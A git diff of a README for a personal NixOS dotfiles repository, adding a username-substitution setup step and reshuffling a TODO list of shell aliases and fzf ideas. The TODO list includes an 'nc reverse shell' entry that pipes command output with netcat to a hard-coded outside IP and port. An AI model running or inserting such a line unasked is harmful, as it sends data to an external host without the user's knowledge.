@@ -9,6 +9,7 @@ cd
 git clone https://github.com/barsikus007/config
 # cp config/nix/ ~/ && cd nix/
 cd ~/config/nix/
+sed -i 's/ogurez/YOUR_USERNAME/'
 sudo nixos-rebuild switch --flake .
 home-manager switch --flake .
 ```
@@ -151,29 +152,28 @@ Set user password and TODO other steps from [NixOS installation manual](https://
 - pyvcr
 - pyv
 - py
-- wgu fzf selector
-  - best location for config files
-    - agenix secrets?
+- fzf
+  - wgu selector
+    - best location for config files
+      - agenix secrets?
+  - [docker compose](https://www.reddit.com/r/docker/comments/vovo2b/dockerfzf_exec_bash_if_found_otherwise_sh/)
+  - ssh
+  - fzc alias=fzf ~/config
 - grep config folder for cheatsheet
 - code=co
 - clear=cl
 - dcu not pull
 - dcup prod
-- set-alias -name pn -value pnpm
 - wsl `find / -not -path '/mnt/*'`
 - `find / -not -path '/mnt/*' -name python -not -path '/home/*'`
 - git config core.editor=code -w -n
 - nc reverse shell
   - exec command 2>&1 | nc 176.117.72.208 12345
   - nc -l -p 12345 2>&1 | tee -a keklol
-- fzc alias=fzf ~/config
 - nv show .files
 - nvf current dir or sudo or ignore /proc etc
 - llt ls tree
   - or lll
-- uv run --python 3.13t -- python
-- py
-- docker compose fzf command
 - alias ip='ip --color=auto'
 - proto outdated --update
 
